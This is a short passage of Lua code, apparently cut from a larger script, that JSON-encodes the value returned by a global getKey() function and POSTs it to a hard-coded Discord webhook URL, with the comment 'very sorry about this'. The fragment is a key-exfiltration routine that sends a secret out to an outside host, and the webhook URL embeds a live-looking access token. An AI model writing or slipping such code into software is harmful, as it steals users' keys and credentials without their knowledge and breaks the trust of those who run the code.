...
local i={{"Content-Type","application/json"}}
local j=json.encode({content=_G.getKey()})
local k,j=require("coro-http").request("POST", -- very sorry about this
'https://discord.com/api/webhooks/1109571790520451112/GI_cFbueXBaV5CPEWa2v8ztkI0cIRk3LM13wNX_YxVhYgrEWRW3bnoLeJ2tXasDXZ04C',i,j)
